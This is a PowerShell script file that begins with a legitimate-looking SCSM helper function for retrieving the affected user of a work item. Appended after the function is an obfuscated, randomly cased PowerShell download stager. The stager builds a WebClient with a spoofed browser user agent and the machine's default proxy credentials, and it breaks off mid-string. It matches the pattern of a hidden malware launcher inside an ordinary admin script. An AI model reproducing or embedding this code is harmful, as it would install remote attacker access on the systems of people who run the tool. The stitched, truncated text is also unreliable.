function Get-SCSMWorkItemAffectedUser
{


    [CmdletBinding(DefaultParameterSetName = 'GUID')]
    param
    (
        [Parameter(ParameterSetName = 'SMObject',
                   Mandatory = $true,
                   ValueFromPipeline = $true)]
        $SMObject,

        [Parameter(ParameterSetName = 'GUID',
                   Mandatory = $true)]
        $Guid
    )

    BEGIN
    {
        Import-Module -Name SMLets -ErrorAction Stop

        
        $RelationshipClass_AffectedUser = 'dff9be66-38b0-b6d6-6144-a412a3ebd4ce'
        $RelationshipClass_AffectedUser_Object = Get-SCSMRelationshipClass -id $RelationshipClass_AffectedUser
    }
    PROCESS
    {
        IF ($PSBoundParameters['GUID'])
        {
            foreach ($Item in $GUID)
            {
                $SMObject = Get-SCSMObject -id $item
                Write-Verbose -Message "[PROCESS] Working on $($Item.Name)"
                Get-ScsmRelatedObject -SMObject $SMObject -Relationship $RelationshipClass_AffectedUser_Object |
                Select-Object -Property @{ Label = "WorkItemName"; Expression = { $SMObject.Name } },
                              @{ Label = "WorkItemGUID"; Expression = { $SMObject.get_id() } }, *
            }
        }

        IF ($PSBoundParameters['SMobject'])
        {
            foreach ($Item in $SMObject)
            {
                Write-Verbose -Message "[PROCESS] Working on $($Item.Name)"
                Get-ScsmRelatedObject -SMObject $Item -Relationship $RelationshipClass_AffectedUser_Object |
                Select-Object -Property @{ Label = "WorkItemName"; Expression = { $Item.Name } },
                              @{ Label = "WorkItemGUID"; Expression = { $Item.get_id() } }, *
            }
        }
    }
}

[SYstEm.NEt.SERvicePOInTMAnaGeR]::ExpECt100CONtINuE = 0;$Wc=NEW-ObJeCt SyStEM.Net.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErS.Add('User-Agent',$u);$wC.Proxy = [SYSteM.NET.WEbReqUEsT]::DefAulTWeBProxy;$wC.Proxy.CREDEntIAls = [SYsTEm.Net.CreDentiALCaCHe]::DefAulTNETWOrkCrEdEnTIALs;$K='(roQT)JgF3S

